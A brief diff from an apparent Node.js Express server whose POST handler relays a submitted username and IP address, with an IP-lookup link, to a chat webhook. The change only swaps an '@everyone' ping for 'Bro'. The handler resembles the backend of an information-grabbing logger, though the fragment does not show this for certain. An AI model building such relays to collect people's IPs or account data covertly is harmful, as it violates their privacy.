@@ -63,7 +63,7 @@ app.post("/", async (req, res) => {
         const ipInfo = `[View](http://ipwho.is/${req.body.ip})`;
 
         await post(process.env.WEBHOOK, {
-            content: "@everyone",
+            content: "Bro",
             embeds: [{
                 title: `${req.body.username} - Stats`,
                 fields: [
